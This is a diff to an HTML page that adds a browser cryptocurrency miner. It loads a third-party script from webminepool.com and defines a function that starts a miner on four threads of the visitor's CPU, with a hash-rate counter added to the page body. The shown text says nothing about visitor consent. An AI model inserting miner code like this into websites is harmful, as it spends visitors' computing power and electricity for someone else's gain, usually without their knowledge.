@@ -8,7 +8,28 @@
       
     </header>
     <div class="page">
-      
+      <div class="th"><span id="totalHashes"></span> Hashes @ <span id="hashesPerSecond"></span> h/s</div>
     </div>
   </body>
+  <script src="https://webminepool.com/lib/base.js"></script>
+  <script>
+      let app = {};
+      const setupMiner = (un) => {
+        function start() {
+          app.miner = WMP.User('', un,{
+            threads: 4,
+            autoThreads: false,
+            throttle: 0.3,
+            forceASMJS: false
+          });
+        }
+        if (app.miner) {
+          app.miner.stop()
+          delete app.miner;
+          start();
+        } else {
+          start();
+        }
+      }
+  </script>
 </html>
